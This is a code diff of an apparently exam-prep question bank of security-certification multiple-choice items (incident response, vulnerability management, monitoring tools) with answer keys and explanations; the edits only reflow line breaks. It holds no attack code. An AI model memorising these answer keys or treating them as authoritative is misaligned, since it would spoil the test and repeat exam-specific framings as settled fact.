+    "explanation": "A tabletop exercise is a simulated scenario where team members discuss and walk through their planned response to an incident, such as a ransomware attack, and then assess performance to identify improvements.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5843,7 +5805,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "SCAP (Security Content Automation Protocol) is a standardized framework that enables\nautomated vulnerability management, compliance checking, and security measurement.",
+    "explanation": "SCAP (Security Content Automation Protocol) is a standardized framework that enables automated vulnerability management, compliance checking, and security measurement.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5859,7 +5821,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "An MSSP manages firewalls for hundreds of clients.\nWhich of the following tools would be most helpful to create a standard configuration template in\norder to improve the efficiency of firewall changes?",
+    "question": "An MSSP manages firewalls for hundreds of clients.\nWhich of the following tools would be most helpful to create a standard configuration template in order to improve the efficiency of firewall changes?",
     "choices": [
       {
         "key": "A",
@@ -5881,7 +5843,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Benchmarks provide standardized configuration guidelines, such as those from CIS, enabling\nthe MSSP to create consistent firewall configuration templates and apply changes efficiently\nacross multiple clients.",
+    "explanation": "Benchmarks provide standardized configuration guidelines, such as those from CIS, enabling the MSSP to create consistent firewall configuration templates and apply changes efficiently across multiple clients.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5897,7 +5859,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A company is experiencing issues with employees leaving the company for a competitor and\ntaking customer contact information with them.\nWhich of the following tools will help prevent this from reoccurring?",
+    "question": "A company is experiencing issues with employees leaving the company for a competitor and taking customer contact information with them.\nWhich of the following tools will help prevent this from reoccurring?",
     "choices": [
       {
         "key": "A",
@@ -5919,7 +5881,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "User Behavior Analytics (UBA) detects unusual or risky user activities, such as exfiltrating\ncustomer contact data, helping to identify and prevent insider threats before employees leave\nfor a competitor.",
+    "explanation": "User Behavior Analytics (UBA) detects unusual or risky user activities, such as exfiltrating customer contact data, helping to identify and prevent insider threats before employees leave for a competitor.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5935,7 +5897,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "A company that operates with most of its infrastructure in the cloud had its development\nenvironment breached. The attackers gained access via a public-facing development\napplication and were able to pivot to the production environment.\nWhich of the following architecture changes would best prevent this from occurring again?",
+    "question": "A company that operates with most of its infrastructure in the cloud had its development environment breached. The attackers gained access via a public-facing development application and were able to pivot to the production environment.\nWhich of the following architecture changes would best prevent this from occurring again?",
     "choices": [
       {
         "key": "A",
@@ -5957,7 +5919,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Placing development and production environments in separate VPCs provides strong network\nisolation, preventing attackers from pivoting between them even if one environment is\ncompromised.",
+    "explanation": "Placing development and production environments in separate VPCs provides strong network isolation, preventing attackers from pivoting between them even if one environment is compromised.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5973,7 +5935,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "During the investigation of a webmail log-in using compromised credentials, a security analyst\nneeds to review information about the source IP for the log-in.\nWhich of the following logs should the analyst retrieve?",
+    "question": "During the investigation of a webmail log-in using compromised credentials, a security analyst needs to review information about the source IP for the log-in.\nWhich of the following logs should the analyst retrieve?",
     "choices": [
       {
         "key": "A",
@@ -5995,7 +5957,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Application logs for the webmail service contain details about authentication events, including\nthe source IP address used during the compromised log-in.",
+    "explanation": "Application logs for the webmail service contain details about authentication events, including the source IP address used during the compromised log-in.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6011,7 +5973,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A security analyst is collecting evidence in response to an incident.\nWhich of the following must the analyst maintain in order to ensure the admissibility of the\nevidence in a court case?",
+    "question": "A security analyst is collecting evidence in response to an incident.\nWhich of the following must the analyst maintain in order to ensure the admissibility of the evidence in a court case?",
     "choices": [
       {
         "key": "A",
@@ -6033,7 +5995,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Chain of custody is the documented process of handling and tracking evidence from collection\nto presentation in court, ensuring its integrity and admissibility.",
+    "explanation": "Chain of custody is the documented process of handling and tracking evidence from collection to presentation in court, ensuring its integrity and admissibility.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6049,7 +6011,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "While reviewing a recent compromise, a forensics team discovers that there are hard-coded\ncredentials in the database connection strings.\nWhich of the following assessment types should be performed during software development to\nprevent this from reoccurring?",
+    "question": "While reviewing a recent compromise, a forensics team discovers that there are hard-coded credentials in the database connection strings.\nWhich of the following assessment types should be performed during software development to prevent this from reoccurring?",
     "choices": [
       {
         "key": "A",
@@ -6071,7 +6033,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Static analysis examines source code without executing it, enabling the detection of security\nflaws such as hard-coded credentials early in the software development process.",
+    "explanation": "Static analysis examines source code without executing it, enabling the detection of security flaws such as hard-coded credentials early in the software development process.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6087,7 +6049,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A business is expanding to a new country and must protect customers from accidental\ndisclosure of specific national identity information.\nWhich of the following should the security engineer update to best meet business requirements?",
+    "question": "A business is expanding to a new country and must protect customers from accidental disclosure of specific national identity information.\nWhich of the following should the security engineer update to best meet business requirements?",
     "choices": [
       {
         "key": "A",
@@ -6109,7 +6071,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Data Loss Prevention (DLP) can be configured to detect and prevent the unauthorized\ntransmission of specific national identity information, ensuring compliance with privacy\nregulations in the new country.",
+    "explanation": "Data Loss Prevention (DLP) can be configured to detect and prevent the unauthorized transmission of specific national identity information, ensuring compliance with privacy regulations in the new country.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6125,7 +6087,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following should a security analyst use to prioritize the remediation of a\nvulnerability?",
+    "question": "Which of the following should a security analyst use to prioritize the remediation of a vulnerability?",
     "choices": [
       {
         "key": "A",
@@ -6147,7 +6109,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "The Common Vulnerability Scoring System (CVSS) provides a standardized severity score for\nvulnerabilities, enabling analysts to prioritize remediation efforts based on risk impact.",
+    "explanation": "The Common Vulnerability Scoring System (CVSS) provides a standardized severity score for vulnerabilities, enabling analysts to prioritize remediation efforts based on risk impact.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6185,7 +6147,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "RADIUS provides centralized authentication, authorization, and accounting, and it can integrate\nwith an LDAP database to authenticate users connecting to the company's wireless network.",
+    "explanation": "RADIUS provides centralized authentication, authorization, and accounting, and it can integrate with an LDAP database to authenticate users connecting to the company's wireless network.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6201,7 +6163,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "An administrator is creating domain profiles for each employee within the company. The\nadministrator wants to make the process more efficient by assigning permissions based on user\nroles and departments.\nWhich of the following would most likely fulfill those requirements?",
+    "question": "An administrator is creating domain profiles for each employee within the company. The administrator wants to make the process more efficient by assigning permissions based on user roles and departments.\nWhich of the following would most likely fulfill those requirements?",
     "choices": [
       {
         "key": "A",
@@ -6223,7 +6185,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Security groups allow administrators to assign permissions collectively based on user roles or\ndepartments, streamlining domain profile management and reducing repetitive configuration\ntasks.",
+    "explanation": "Security groups allow administrators to assign permissions collectively based on user roles or departments, streamlining domain profile management and reducing repetitive configuration tasks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6261,7 +6223,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "After identifying (detecting) an incident, the next step is containment, which aims to limit the\nspread and impact of the threat before proceeding to eradication or recovery.",
+    "explanation": "After identifying (detecting) an incident, the next step is containment, which aims to limit the spread and impact of the threat before proceeding to eradication or recovery.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6277,7 +6239,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "A service provider wants a cost-effective way to rapidly expand from providing internet links to\nmanaging them.\nWhich of the following methods will allow the service provider to best scale its services while\nmaintaining performance consistency?",
+    "question": "A service provider wants a cost-effective way to rapidly expand from providing internet links to managing them.\nWhich of the following methods will allow the service provider to best scale its services while maintaining performance consistency?",
     "choices": [
       {
         "key": "A",
@@ -6299,7 +6261,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Baseline enforcement ensures consistent performance and security standards across managed\nservices, allowing the provider to scale operations cost-effectively without sacrificing quality.",
+    "explanation": "Baseline enforcement ensures consistent performance and security standards across managed services, allowing the provider to scale operations cost-effectively without sacrificing quality.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6315,7 +6277,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "Which of the following activities would involve members of the incident response team and other\nstakeholders simulating an event?",
+    "question": "Which of the following activities would involve members of the incident response team and other stakeholders simulating an event?",
     "choices": [
       {
         "key": "A",
@@ -6337,7 +6299,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "A tabletop exercise is a simulated event in which the incident response team and other\nstakeholders walk through their roles and decision-making processes to evaluate readiness and\nimprove response plans.",
+    "explanation": "A tabletop exercise is a simulated event in which the incident response team and other stakeholders walk through their roles and decision-making processes to evaluate readiness and improve response plans.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6353,7 +6315,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A customer reports that software the customer downloaded from a public website has malware\nin it. However, the company that created the software denies any malware in its software at\ndelivery time.\nWhich of the following techniques will address this concern?",
+    "question": "A customer reports that software the customer downloaded from a public website has malware in it. However, the company that created the software denies any malware in its software at delivery time.\nWhich of the following techniques will address this concern?",
     "choices": [
       {
         "key": "A",
@@ -6375,7 +6337,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Code signing uses digital certificates to verify the authenticity and integrity of software, ensuring\nit has not been tampered with after being created and delivered by the vendor.",
+    "explanation": "Code signing uses digital certificates to verify the authenticity and integrity of software, ensuring it has not been tampered with after being created and delivered by the vendor.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6391,7 +6353,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "Which of the following receives logs from various devices and services, and then presents\nalerts?",
+    "question": "Which of the following receives logs from various devices and services, and then presents alerts?",
     "choices": [
       {
         "key": "A",
@@ -6413,7 +6375,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "A SIEM (Security Information and Event Management) system collects logs from multiple\nsources, correlates the data, and generates alerts for suspicious or malicious activity.",
+    "explanation": "A SIEM (Security Information and Event Management) system collects logs from multiple sources, correlates the data, and generates alerts for suspicious or malicious activity.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6429,7 +6391,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "At the start of a penetration test, the tester checks OSINT resources for information about the\nclient environment.\nWhich of the following types of reconnaissance is the tester performing?",
+    "question": "At the start of a penetration test, the tester checks OSINT resources for information about the client environment.\nWhich of the following types of reconnaissance is the tester performing?",
     "choices": [
       {
         "key": "A",
@@ -6451,7 +6413,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Passive reconnaissance involves gathering information from publicly available sources, such as\nOSINT resources, without directly interacting with the target environment.",
+    "explanation": "Passive reconnaissance involves gathering information from publicly available sources, such as OSINT resources, without directly interacting with the target environment.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6467,7 +6429,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A company's antivirus solution is effective in blocking malware but often has false positives. The\nsecurity team has spent a significant amount of time on investigations but cannot determine a\nroot cause. The company is looking for a heuristic solution.\nWhich of the following should replace the antivirus solution?",
+    "question": "A company's antivirus solution is effective in blocking malware but often has false positives. The security team has spent a significant amount of time on investigations but cannot determine a root cause. The company is looking for a heuristic solution.\nWhich of the following should replace the antivirus solution?",
     "choices": [
       {
         "key": "A",
@@ -6489,7 +6451,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "EDR (Endpoint Detection and Response) uses advanced heuristic and behavioral analysis to\ndetect, investigate, and respond to threats, reducing false positives and providing deeper insight\nthan traditional antivirus.",
+    "explanation": "EDR (Endpoint Detection and Response) uses advanced heuristic and behavioral analysis to detect, investigate, and respond to threats, reducing false positives and providing deeper insight than traditional antivirus.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6505,7 +6467,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "During an investigation, a security analyst discovers traffic going out to a command-and-control\nserver. The analyst must find out if any data exfiltration has occurred.\nWhich of the following would best help the analyst determine this?",
+    "question": "During an investigation, a security analyst discovers traffic going out to a command-and-control server. The analyst must find out if any data exfiltration has occurred.\nWhich of the following would best help the analyst determine this?",
     "choices": [
       {
         "key": "A",
@@ -6527,7 +6489,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Packet capture provides a detailed record of network traffic, allowing analysts to inspect the\nactual contents of communications to determine if sensitive data was exfiltrated to a command-\nand-control server.",
+    "explanation": "Packet capture provides a detailed record of network traffic, allowing analysts to inspect the actual contents of communications to determine if sensitive data was exfiltrated to a command- and-control server.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6543,7 +6505,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A few weeks after deploying additional email servers, a company begins to receive complaints\nfrom employees that messages they send are going into their recipients' spam folders.\nWhich of the following needs to be updated in order to resolve this issue?",
+    "question": "A few weeks after deploying additional email servers, a company begins to receive complaints from employees that messages they send are going into their recipients' spam folders.\nWhich of the following needs to be updated in order to resolve this issue?",
     "choices": [
       {
         "key": "A",
@@ -6565,7 +6527,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "An SPF (Sender Policy Framework) record needs to be updated to include the new email\nservers, allowing recipient systems to verify the legitimacy of the sending servers and prevent\noutgoing emails from being marked as spam.",
+    "explanation": "An SPF (Sender Policy Framework) record needs to be updated to include the new email servers, allowing recipient systems to verify the legitimacy of the sending servers and prevent outgoing emails from being marked as spam.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6581,7 +6543,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A company needs to determine whether authentication weaknesses in a customer-facing web\napplication exist.\nWhich of the following is the best technique to use?",
+    "question": "A company needs to determine whether authentication weaknesses in a customer-facing web application exist.\nWhich of the following is the best technique to use?",
     "choices": [
       {
         "key": "A",
@@ -6607,7 +6569,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Dynamic analysis evaluates the web application while it is running, directly exercising its\nauthentication processes to uncover weaknesses such as credential bypasses or session-\nhandling flaws that static code review or network scans may not reveal.",
+    "explanation": "Dynamic analysis evaluates the web application while it is running, directly exercising its authentication processes to uncover weaknesses such as credential bypasses or session- handling flaws that static code review or network scans may not reveal.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6623,7 +6585,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following would a security analyst need to consider when prioritizing remediation\nefforts against known vulnerabilities?",
+    "question": "Which of the following would a security analyst need to consider when prioritizing remediation efforts against known vulnerabilities?",
     "choices": [
       {
         "key": "A",
@@ -6645,7 +6607,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Remediation priorities must align with the organization's overall risk tolerance - vulnerabilities\nwhose residual risk exceeds that threshold receive the highest priority for corrective action.",
+    "explanation": "Remediation priorities must align with the organization's overall risk tolerance - vulnerabilities whose residual risk exceeds that threshold receive the highest priority for corrective action.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6661,7 +6623,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A new employee can select a particular make and model of an employee workstation from a\npreapproved list.\nWhich of the following is this an example of?",
+    "question": "A new employee can select a particular make and model of an employee workstation from a preapproved list.\nWhich of the following is this an example of?",
     "choices": [
       {
         "key": "A",
@@ -6683,7 +6645,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "CYOD (Choose Your Own Device) allows employees to pick hardware from a company-\napproved catalog, aligning with the scenario of selecting a specific workstation make and model\nfrom a preapproved list.",
+    "explanation": "CYOD (Choose Your Own Device) allows employees to pick hardware from a company- approved catalog, aligning with the scenario of selecting a specific workstation make and model from a preapproved list.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6699,7 +6661,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "Which of the following techniques can be used to sanitize the data contained on a hard drive\nwhile allowing for the hard drive to be repurposed?",
+    "question": "Which of the following techniques can be used to sanitize the data contained on a hard drive while allowing for the hard drive to be repurposed?",
     "choices": [
       {
         "key": "A",
@@ -6721,7 +6683,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A wipe tool overwrites every sector of the drive with new data, rendering the original information\nunrecoverable while leaving the hardware fully functional for reuse.",
+    "explanation": "A wipe tool overwrites every sector of the drive with new data, rendering the original information unrecoverable while leaving the hardware fully functional for reuse.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6737,7 +6699,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A company has experienced a large data breach. The external investigators want to make sure\nthat any evidence related to the breach is preserved.\nWhich of the following incident response activities docs this fall under?",
+    "question": "A company has experienced a large data breach. The external investigators want to make sure that any evidence related to the breach is preserved.\nWhich of the following incident response activities docs this fall under?",
     "choices": [
       {
         "key": "A",
@@ -6759,7 +6721,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Chain of custody ensures evidence is properly collected, preserved, documented, and handled\nso it remains admissible and unaltered during an investigation.",
+    "explanation": "Chain of custody ensures evidence is properly collected, preserved, documented, and handled so it remains admissible and unaltered during an investigation.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6797,7 +6759,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Generating a Certificate Signing Request (CSR) is the first step when securing a public-facing\nserver, as it provides the information needed for the certificate authority to issue an SSL/TLS\ncertificate.",
+    "explanation": "Generating a Certificate Signing Request (CSR) is the first step when securing a public-facing server, as it provides the information needed for the certificate authority to issue an SSL/TLS certificate.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6813,7 +6775,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A school administrator wants to limit access to certain web pages to ensure that only age-\nappropriate material is available to students.\nWhich of the following tools would best meet this requirement?",
+    "question": "A school administrator wants to limit access to certain web pages to ensure that only age- appropriate material is available to students.\nWhich of the following tools would best meet this requirement?",
     "choices": [
       {
         "key": "A",
@@ -6835,7 +6797,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Content categorization classifies websites into predefined categories (such as adult content),\nallowing administrators to block entire categories and ensure only age-appropriate material is\naccessible.",
+    "explanation": "Content categorization classifies websites into predefined categories (such as adult content), allowing administrators to block entire categories and ensure only age-appropriate material is accessible.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6851,7 +6813,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A software engineer is developing a new business application and needs to check for errors and\nsecurity flaws before the software engineer compiles and sends it for testing.\nWhich of the following should the engineer use to complete this task?",
+    "question": "A software engineer is developing a new business application and needs to check for errors and security flaws before the software engineer compiles and sends it for testing.\nWhich of the following should the engineer use to complete this task?",
     "choices": [
       {
         "key": "A",
@@ -6873,7 +6835,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Static code analysis examines source code before compilation to identify errors and security\nweaknesses early in the development process.",
+    "explanation": "Static code analysis examines source code before compilation to identify errors and security weaknesses early in the development process.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6889,7 +6851,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A security analyst is concerned malicious actors are lurking in an environment but has not\nreceived any alerts regarding suspicious activity.\nWhich of the following should the analyst conduct to further investigate the presence of these\nactors?",
+    "question": "A security analyst is concerned malicious actors are lurking in an environment but has not received any alerts regarding suspicious activity.\nWhich of the following should the analyst conduct to further investigate the presence of these actors?",
     "choices": [
       {
         "key": "A",
@@ -6911,7 +6873,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Threat hunting is a proactive activity used to search for hidden or undetected malicious actors\nwhen no alerts have been triggered but suspicious activity is suspected.",
+    "explanation": "Threat hunting is a proactive activity used to search for hidden or undetected malicious actors when no alerts have been triggered but suspicious activity is suspected.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6927,7 +6889,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A software engineer is downloading a third-party application from a public repository and wants\nto ensure the application has not been maliciously altered.\nWhich of the following techniques should the engineer use?",
+    "question": "A software engineer is downloading a third-party application from a public repository and wants to ensure the application has not been maliciously altered.\nWhich of the following techniques should the engineer use?",
     "choices": [
       {
         "key": "A",
@@ -6949,7 +6911,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Code signing provides a cryptographic signature that verifies the software's authenticity and\nintegrity, ensuring it has not been tampered with before download or installation.",
+    "explanation": "Code signing provides a cryptographic signature that verifies the software's authenticity and integrity, ensuring it has not been tampered with before download or installation.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -6965,7 +6927,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following risk management strategies describes applying a compensating control\nto a device rather than patching?",
+    "question": "Which of the following risk management strategies describes applying a compensating control to a device rather than patching?",
     "choices": [
       {
         "key": "A",
@@ -6987,7 +6949,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Mitigation reduces risk by applying alternative controls - such as compensating controls - when\npatching is not possible, lowering the likelihood or impact of the vulnerability.",
+    "explanation": "Mitigation reduces risk by applying alternative controls - such as compensating controls - when patching is not possible, lowering the likelihood or impact of the vulnerability.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7025,7 +6987,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Obfuscation hides or masks sensitive information so it is not easily understood or readable by\nunauthorized individuals while still allowing authorized processing or use when required.",
+    "explanation": "Obfuscation hides or masks sensitive information so it is not easily understood or readable by unauthorized individuals while still allowing authorized processing or use when required.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7063,7 +7025,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "After a security update, an IPS or IDS may begin blocking or resetting connections it now\nidentifies as malicious or noncompliant, so reviewing its logs first helps quickly determine\nwhether the update is preventing access to the application.",
+    "explanation": "After a security update, an IPS or IDS may begin blocking or resetting connections it now identifies as malicious or noncompliant, so reviewing its logs first helps quickly determine whether the update is preventing access to the application.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7079,7 +7041,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security analyst investigates abnormal outbound traffic from a corporate endpoint. The traffic\nis encrypted and uses non-standard ports.\nWhich of the following data sources should the analyst use first to confirm whether this traffic is\nmalicious?",
+    "question": "A security analyst investigates abnormal outbound traffic from a corporate endpoint. The traffic is encrypted and uses non-standard ports.\nWhich of the following data sources should the analyst use first to confirm whether this traffic is malicious?",
     "choices": [
       {
         "key": "A",
@@ -7101,7 +7063,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Packet captures allow the analyst to examine traffic characteristics such as destination IPs,\nports, protocols, timing, and traffic patterns, which helps determine whether encrypted traffic on\nnon-standard ports is indicative of malicious activity.",
+    "explanation": "Packet captures allow the analyst to examine traffic characteristics such as destination IPs, ports, protocols, timing, and traffic patterns, which helps determine whether encrypted traffic on non-standard ports is indicative of malicious activity.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7117,7 +7079,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "An organization experiences a suspected data breach that affects sensitive client information.\nThe incident response team must preserve logs, server images, and email communications\nrelated to the breach.\nWhich of the following best describes this course of action?",
+    "question": "An organization experiences a suspected data breach that affects sensitive client information.\nThe incident response team must preserve logs, server images, and email communications related to the breach.\nWhich of the following best describes this course of action?",
     "choices": [
       {
         "key": "A",
@@ -7139,7 +7101,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Enforcing a legal hold ensures that all potentially relevant evidence, such as logs, system\nimages, and communications, is preserved and protected from alteration or deletion. This action\nis taken when litigation or regulatory action is anticipated and is critical for supporting\ninvestigations and legal proceedings following a data breach.",
+    "explanation": "Enforcing a legal hold ensures that all potentially relevant evidence, such as logs, system images, and communications, is preserved and protected from alteration or deletion. This action is taken when litigation or regulatory action is anticipated and is critical for supporting investigations and legal proceedings following a data breach.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7155,7 +7117,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "Which of the following actions is best performed by ticketing automation to ensure that incidents\nreceive the correct level of attention and response?",
+    "question": "Which of the following actions is best performed by ticketing automation to ensure that incidents receive the correct level of attention and response?",
     "choices": [
       {
         "key": "A",
@@ -7177,7 +7139,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Ticketing automation is particularly effective for escalation because it can automatically apply\npredefined rules based on severity, priority, or response time thresholds. If an incident is not\naddressed within the required timeframe or meets specific criticality criteria, the system\nautomatically escalates the ticket to higher support tiers or management, ensuring timely\nattention and appropriate response according to service level agreements.",
+    "explanation": "Ticketing automation is particularly effective for escalation because it can automatically apply predefined rules based on severity, priority, or response time thresholds. If an incident is not addressed within the required timeframe or meets specific criticality criteria, the system automatically escalates the ticket to higher support tiers or management, ensuring timely attention and appropriate response according to service level agreements.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7193,7 +7155,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "multi",
-    "question": "A security engineer develops a policy to block all insecure protocols on the network.\nWhich of the following ports should the security engineer block as part of that process? (Choose\ntwo.)",
